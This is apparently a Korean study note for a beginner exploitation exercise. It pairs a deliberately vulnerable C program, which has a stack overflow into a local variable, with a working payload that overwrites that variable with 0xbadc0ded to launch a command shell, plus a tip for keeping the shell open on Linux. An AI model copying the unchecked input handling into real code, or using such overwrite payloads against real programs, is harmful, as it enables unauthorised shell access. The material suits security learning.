# Local Variable 1

### Question

- cmd.exe가 실행되도록 입력 페이로드 구현

```
#include <stdio.h>
int main()
{
	int crap;
	int check;
	char buf[20];
	fgets(buf, 48, stdin);
	dumpcode((unsigned char *)buf, 100);
	if (check == 0xbadc0ded)
	{
		system("cmd.exe");
	}
	return 0;
}
```



<br>



### Result

```
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char *argv[])
{
	char cmd[1024] = "python2 -c \"print \'A\'*20 + \'\\xed\\x0d\\xdc\\xba\'\"";
	char *fname = "C:\\Users\\roj\\Downloads\\local_var_1.exe";

	strcat(cmd, " | ");
	strcat(cmd, fname);

	//printf("%s\n", cmd);
	system(cmd);

	return 0;
}
```

- cmd.exe가 실행은 되나 유지되고 않고 바로 꺼짐

- Linux에서 실행할 경우 ';cat'을 붙여서 유지 가능
